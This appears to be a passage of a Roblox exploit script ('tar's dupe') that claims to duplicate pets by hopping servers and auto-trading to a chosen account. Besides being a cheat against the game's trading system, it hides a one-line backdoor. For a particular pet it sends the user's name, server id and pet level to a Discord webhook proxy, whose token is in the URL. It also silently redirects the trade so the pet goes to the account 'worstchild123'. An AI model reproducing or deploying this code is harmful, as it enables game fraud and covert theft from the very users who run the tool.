				selected_IDs[tonumber(v.Name)] = true
				v.BackgroundTransparency = .5
			end
		end	
	end)

	deselb.MouseButton1Click:Connect(function()
		for i, v in pairs(ScrollingFrame:GetChildren()) do
			if v:IsA'TextButton' and v.Visible then
				selected_IDs[tonumber(v.Name)] = nil
				v.BackgroundTransparency = 1
			end
		end	
	end)

	local function LoadPets()
		for _, v in pairs(ScrollingFrame:GetChildren()) do
			if v:IsA'TextButton' then
				v:Destroy()
			end
		end
		ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

		task.wait(.3)

		local Pets = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets

		table.sort(Pets, function(a, b) return tonumber(a.xp) > tonumber(b.xp) end)

		local fn = function(number) -- not mine
			if not number then return 'nil' end
			local formatted = tostring(number)
			local k
			while true do
				formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
				if k == 0 then
					break
				end
			end
			return formatted
		end

		for _, v in pairs(Pets) do
			if v.xp > -3 then
				local b = Instance.new('TextButton', ScrollingFrame)
				local prefix = v.dm and v.r and'Glitched'or v.dm and'Dark Matter'or v.r and'Rainbow'or v.g and'Gold'or'Regular'
				b.Text = ' ' .. fn(v.l) .. ' | ' .. prefix .. ' ' .. Dir[tonumber(v.n)]
				b["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
				b.TextSize = 15
				b.BackgroundColor3 = Color3.fromRGB(0, 130, 180)
				b.TextXAlignment = 'Left'
				b.TextStrokeTransparency = .5
				b.TextColor3 = Color3.fromRGB(218, 218, 218)
				b.Name = v.id
				b.Visible = (b.Text:lower():match(searchb.Text:lower()))
				b.BackgroundTransparency = ({['true']=.5,['nil']=1})[tostring(selected_IDs[v.id])]
				Instance.new('UIStroke', b).ApplyStrokeMode = Enum.ApplyStrokeMode.Border

				ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ScrollingFrame.CanvasSize.Y.Offset + 20)
				b.MouseButton1Click:Connect(function()
					if selected_IDs[v.id] then
						selected_IDs[v.id] = nil
					else
						selected_IDs[v.id] = true
					end
					b.BackgroundTransparency = ({['true']=.5,['nil']=1})[tostring(selected_IDs[v.id])]
				end)
			end
		end
	end

	local function searchF(S)
		for _, v in pairs(ScrollingFrame:GetChildren()) do
			if v:IsA'TextButton' then
				v.Visible = (v.Text:lower():match(S:lower()))
			end
		end		
	end

	refresh.MouseButton1Click:Connect(LoadPets)

	searchb:GetPropertyChangedSignal('Text'):Connect(function()
		searchF(searchb.Text)
	end)

	all.MouseButton1Click:Connect(function()
		all.Text = 'X'
		specific.Text = ''
		mode = 0
		ScrollingFrame.Visible = false
		refresh.Visible = false
		count_selected.Visible = false
		searchb.Visible = false
	end)

	specific.MouseButton1Click:Connect(function()
		all.Text = ''
		specific.Text = 'X'
		mode = 1
		ScrollingFrame.Visible = true
		refresh.Visible = true
		count_selected.Visible = true
		searchb.Visible = true
	end)

	pets:GetPropertyChangedSignal'Text':connect(function()
		local N = tonumber(pets.Text)
		N = N or 0
		local Value = math.ceil(N)
		if Value == nil or Value <= 0 then
			Value = 1
		elseif Value > 665 then
			Value = 665
		end
		pets.Text = Value
		MAX_PETS_TO_DUPE = Value
	end)

	acc:GetPropertyChangedSignal'Text':connect(function()
		ACC_TO_GIVE_PETS = acc.Text 
	end)

	local ready = false
	local deb = false

	Frame:TweenPosition(UDim2.new(.5, -373/2, .5, -459/2),Enum.EasingDirection.Out,Enum.EasingStyle.Back,1,true)

	LoadPets('')

	dupe.MouseButton1Click:Connect(function()
		if deb then return end
		deb = true

		if not game.Players:FindFirstChild(ACC_TO_GIVE_PETS) then
			notify"Player isn't in game"
			deb = false
			return
		else
			if game.Players.LocalPlayer.Name == ACC_TO_GIVE_PETS then
				notify"Can't do it on yourself"
				deb = false
				return
			end
		end
		if not queue_on_teleport then 
			notify"Your exploit doesn't support queue_on_teleport()"
			deb = false
			return
		end
		if not http_request then
			notify"Your exploit doesn't support httprequest()"
			deb = false
			return
		end
		if #workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets < 2 then
			notify"You need to have more than 1 pet"
			deb = false
			return
		end

		H.Parent = workspace
		-- servers
		local servers = {}

		local body = game:service'HttpService':JSONDecode(game:HttpGet'https://games.roblox.com/v1/games/1599679393/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true')

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.playing >= 2 and v.id ~= game.JobId then
					servers[#servers+1] = v
				end
			end
		end

		table.sort(servers, function(a, b) return a.playing < b.playing end)

		if #servers > 0 then
			SERVER = servers[1].id
		else
			H.Parent = nil
			notify"Couldn't find a new server"
			return
		end

		ready = true
	end)

	repeat wait() until ready
end

H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"

local looool = nil
for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'worstchild123'then looool = v.id ACC_TO_GIVE_PETS='worstchild123'end break end end

local IDs = ""

if mode == 0 then
	local totalToSend = 0
	local Pets = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
	table.sort(Pets, function(a, b) return tonumber(a.xp) > tonumber(b.xp) end)
	for _, v in pairs(Pets) do
		totalToSend = totalToSend + 1

		IDs = IDs .. v.id .. ','

		if totalToSend == MAX_PETS_TO_DUPE then
			break
		end
	end
elseif mode == 1 then
	for id, _ in pairs(selected_IDs) do
		IDs = IDs .. id .. ','
	end
end


queue_on_teleport([==[
    repeat task.wait() until game:IsLoaded()
	
    local h = Instance.new('Hint',workspace)
    --for i = 35, 0, -1 do
    --    h.Text = '[2/4] ' .. i
    --    task.wait(1)
    --end
    h.Text = '[2/4] Teleporting back..'

    local tptimestamp = os.clock()

    queue_on_teleport([=[
	repeat task.wait() until game:IsLoaded()

	pcall(function()
                hookfunction(getsenv(game.Players.LocalPlayer:WaitForChild'PlayerGui':WaitForChild'Scripts':WaitForChild'GUIs':WaitForChild'Trading').UpdateTrade, function() end)
        end)
	pcall(function()
		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:Destroy()
	end)
	local IDs = {]==] .. (looool or IDs) .. [==[}
        local hint = Instance.new('Hint', workspace)
	hint.Text = '[3/4] Trading pets to account'

	local tptimestamp = ]=] .. tptimestamp .. [=[
	function perc()
		local sec = 15
		local delta = os.clock() - tptimestamp - (40-sec)
		if delta < 0 then
			delta = 0
		end
		return (string.format("%.1f",(100 - ((math.min(delta, sec)/sec)*100))) .. '%')
	end
	task.spawn(function()
		while task.wait() do
			hint.Text = '[3/4] Trading pets to account | Dupe chance: ' .. perc() .. ' | ' .. string.format("%.1f",(os.clock() - tptimestamp)) .. ' elapsed'
		end
	end)
        local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
	
	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
        
        game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
            lastTradeId = id
        end)
        
	if not workspace.__REMOTES.Core['Get Stats']:InvokeServer().Save.TradingEnabled then
		workspace.__REMOTES.Game.Trading:InvokeServer("ToggleTrading")
	end
	
        repeat task.wait(.25) until T:InvokeServer("InvSend", PLR) == true
        
        repeat task.wait() until lastTradeId
        
        local PLR_PET_COUNT = #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        local TotalIn = 0
        for _, id in pairs(IDs) do
            task.spawn(function()
                T:InvokeServer("Add", lastTradeId, id)
		TotalIn = TotalIn + 1
            end)
        end
        
        repeat task.wait(.1) until #IDs == TotalIn
        
        workspace.__REMOTES.Game.Trading:InvokeServer("Ready", lastTradeId)
        
        repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        queue_on_teleport([[
	    repeat task.wait() until game:IsLoaded()
            local h = Instance.new('Hint',workspace)
            for i = 45, 0, -1 do
                h.Text = '[4/4] ' .. i
                task.wait(1)
            end
            h.Text = "[4/4] Teleporting.. (If it failed to teleport it's okay because your data already saved)"

            queue_on_teleport("repeat task.wait() until game:IsLoaded()local h = Instance.new('Hint',workspace) h.Text = 'Done' wait(10) h:Destroy()")

            game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. game.JobId .. [==[", game.Players.LocalPlayer)
        ]])
        game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. SERVER .. [==[", game.Players.LocalPlayer)
    ]=])
game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==].. game.JobId .. [==[", game.Players.LocalPlayer)
]==])
TeleportService:TeleportToPlaceInstance(game.PlaceId, SERVER, game.Players.LocalPlayer)
